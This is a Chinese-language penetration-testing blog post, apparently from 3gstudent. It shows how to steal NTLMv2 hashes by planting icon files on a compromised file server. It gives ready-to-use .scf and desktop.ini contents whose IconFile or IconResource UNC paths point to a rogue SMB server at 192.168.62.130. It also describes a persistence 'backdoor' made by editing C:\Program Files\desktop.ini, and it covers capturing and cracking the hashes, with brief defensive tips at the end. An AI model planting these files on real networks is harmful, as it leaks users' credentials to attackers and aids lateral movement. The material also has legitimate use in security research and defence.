---
layout: post
title: 渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash
---

## 0x00 前言
---

在文章[《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/)介绍了在服务器上通过Windows命令行抓包获取连接文件服务器的NTLMv2 Hash的方法，解决了一个有趣的问题：

`如果获得了内网一个文件服务器的权限，如何获得更多用户的口令？`

本文将换一种实现方式，通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。

## 0x01 简介
---

本文将要介绍以下内容：

- 添加scf文件强制用户访问伪造的文件服务器
- 修改文件夹图标强制用户访问伪造的文件服务器
- 文件夹图标后门
- 防御思路

## 0x02 实现思路
---

利用SMB协议的特性，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录

在用户访问文件服务器时，如果我们能够欺骗用户访问伪造的文件服务器，并在伪造的文件服务器上抓包，那么就能获得用户本机的NTLMv2 Hash

所以关键是如何欺骗用户访问伪造的文件服务器，同时又保证隐蔽

欺骗用户访问伪造的文件服务器的方法有多种(钓鱼方式暂略)，那么有没有当用户打开文件共享时，自动访问伪造文件服务器的方法呢？当然是有的，接下来主要介绍两种实现方式

## 0x03 添加scf文件强制用户访问伪造的文件服务器
---

其他文章对该方法已经有过介绍，参考资料：

https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

https://xianzhi.aliyun.com/forum/topic/1624

这里简要介绍一下原理

**scf文件：**

SCF文件是"WINDOWS资源管理器命令"文件，是一种可执行文件,该类型文件由Windows Explorer Command解释，标准安装

包含三种类型：

- Explorer.scf(资源管理器)
- Show Desktop.scf(显示桌面)
- View Channels.scf（查看频道）

格式示例：

```
[Shell]
Command=2
IconFile=explorer.exe,3
[Taskbar]
Command=ToggleDesktop
```

IconFile属性支持UNC路径，也就是说，可以指定文件服务器上的某个文件，例如`IconFile=\\192.168.62.130\test\explorer.exe,3`

特别的地方： 使用Explore.exe打开包含该文件的路径时，由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标，如果图标位于文件服务器，就会访问该文件服务器

直观理解： 打开某一文件夹，该文件夹下面包含scf文件，scf文件的IconFile属性指向文件服务器，本机会自动访问该文件服务器，在访问过程中，默认先使用本机的用户名和密码hash尝试登录。如果文件服务器抓取数据包，就能够获得NTLMv2 Hash

### 实际测试：

正常文件服务器IP: 192.168.62.139

伪造文件服务器IP： 192.168.62.130

客户端IP： 192.168.62.135


#### 1、正常文件服务器共享目录下添加文件test.scf，内容如下：

```
[Shell]
Command=2
IconFile=\\192.168.62.130\test\test.ico
[Taskbar]
Command=ToggleDesktop
```

**注：**

IconFile指向伪造文件服务器，test.ico不存在

#### 2、在伪造文件服务器上使用wireshark进行抓包

#### 3、客户端访问正常文件服务器

#### 4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/2-1.png)

构造特定格式`username::domain:challenge:HMAC-MD5:blob`，使用Hashcat破解即可

具体破解方法可参考文章：

[《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)

[《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/)

经过实际测试，我们可以看到，利用的关键是要在文件服务器上添加scf文件，等待用户访问

那么，有没有更为隐蔽的方法呢？

## 0x04 修改文件夹图标强制用户访问伪造的文件服务器
---

参考scf文件的利用原理，需要找到可以指定IconFile属性的特殊文件

经过寻找，我找到了一个合适的方法： `修改文件夹图标强制用户访问伪造的文件服务器`

### 修改文件夹图标的方法：

选中`文件夹`-`右键`-`属性`-`自定义`-`更改图标`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/2-2.png)

更好后，在文件夹子目录生成文件desktop.ini，格式如下：

```
[.ShellClassInfo]
IconResource=C:\Windows\system32\SHELL32.dll,3
[ViewState]
Mode=
Vid=
FolderType=Generic
```

尝试将IconResource属性替换为UNC路径，路径为`IconResource=\\192.168.62.130\test\SHELL32.dll,3`

测试成功

### 实际测试：

正常文件服务器IP: 192.168.62.139

伪造文件服务器IP： 192.168.62.130

客户端IP： 192.168.62.135

#### 1、正常文件服务器共享目录的test文件夹下添加文件desktop.ini，内容如下：

```
[.ShellClassInfo]
IconResource=\\192.168.62.130\test\SHELL32.dll,4
[ViewState]
Mode=
Vid=
FolderType=Generic

```

**注：**

IconResource指向伪造文件服务器，SHELL32.dll不存在

#### 2、在伪造文件服务器上使用wireshark进行抓包

#### 3、客户端访问正常文件服务器

#### 4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/3-1.png)

通过这种方式，相比于scf文件，隐蔽性更高

## 0x05 文件夹图标后门
---

原理同上，更改系统文件夹的配置文件desktop.ini，当用户打开指定文件夹时，将本机当前用户的NTLMv2 Hash发送至伪造文件服务器

默认情况下，系统常见文件夹下包含配置文件desktop.ini，例如文件夹`Program Files`，desktop.ini内容如下：

```
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21781
```

尝试对其修改，添加如下内容：

```
IconResource=\\192.168.62.130\test\SHELL32.dll,4
```

**注：**

需要管理员权限

测试成功

### 实际测试：

客户端IP: 192.168.62.139

伪造文件服务器IP： 192.168.62.130

#### 1、修改客户端文件，路径为C:\Program Files\desktop.ini，添加内容

```
IconResource=\\192.168.62.130\test\SHELL32.dll,4
```

**注：**

IconResource指向伪造文件服务器，SHELL32.dll不存在

#### 2、在伪造文件服务器上使用wireshark进行抓包

#### 3、客户端访问文件夹c:\

#### 4、伪造文件服务器获得客户端本机当前用户的NTLMv2 Hash

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-23/3-2.png)

通过这种方式，相比于scf文件，无需添加文件，但需要管理员权限


## 0x06 防御思路
---

结合攻击方法，总结防御思路如下：

检查特殊文件.scf和desktop.ini，避免被添加UNC路径

如无特殊需要，建议配置防火墙规则禁止139和445端口

## 0x07 小结
---

本文换了一种方式，解决了在获得内网一个文件服务器的权限后，获得更多用户的口令的问题。

通过修改文件服务器上的图标文件，强制用户访问伪造的文件服务器，在伪造的文件服务器上抓包获取连接文件服务器的NTLMv2 Hash。

结合攻击方法，总结防御思路。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



